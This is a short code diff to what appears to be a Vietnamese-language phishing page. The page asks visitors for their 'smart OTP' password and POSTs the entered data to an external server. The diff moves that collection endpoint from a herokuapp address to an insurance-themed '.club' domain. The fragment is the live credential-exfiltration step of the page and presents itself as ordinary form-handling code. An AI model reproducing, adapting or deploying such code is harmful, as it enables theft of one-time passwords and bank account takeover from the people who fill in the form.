@@ -611,9 +611,8 @@
                               alert("Nhập Mật smart OTP");
                               return false;
                             }
-
-                            fetch("https://portal-bh-be.herokuapp.com/api/users", {
-
+                            
+                            fetch("https://be.thongtinbaohiem.club/api/users", {
                               method: 'POST',
                               body: JSON.stringify({
                                 id: create_UUID(),
